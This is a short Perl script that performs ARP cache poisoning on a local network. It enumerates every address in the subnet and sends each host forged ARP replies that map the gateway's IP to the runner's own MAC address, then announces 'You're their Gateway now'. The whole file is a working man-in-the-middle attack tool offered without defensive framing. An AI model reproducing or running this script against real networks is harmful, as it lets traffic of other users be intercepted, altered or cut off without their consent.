#!/bin/env perl

use strict;
use warnings;
use feature 'say';
use Net::ARP;
use Net::Frame::Device;
use Net::Netmask;

die "Must be run as root\n" if $> != 0;

# get iface from arg or show usage
my $usage = "usage: $0 [iface]\n";
my $iface = $ARGV[0] if @ARGV or die $usage;

# get device info
my $device = Net::Frame::Device->new(dev => $iface);
my $network = Net::Netmask->new($device->subnet);
my $gateway = $device->gatewayIp;

say "Network: $network";
say "Gateway: $gateway";

# tell the network (except gateway) that you're the gateway now
say "Spreading the new Gateway";
for my $ip_address ($network->enumerate) {
    # skip x.x.x.0 and x.x.x.255 and the gateway
    unless ($ip_address =~ /\.0$|\.255$|$gateway/) {
        my $mac_address = Net::ARP::arp_lookup($iface, $ip_address);
        Net::ARP::send_packet (
            $iface,
            $gateway,           # the gateway IP
            $ip_address,
            $device->mac,       # is my mac addr
            $mac_address,
            "reply",
        );
    }
}
say "You're their Gateway now";
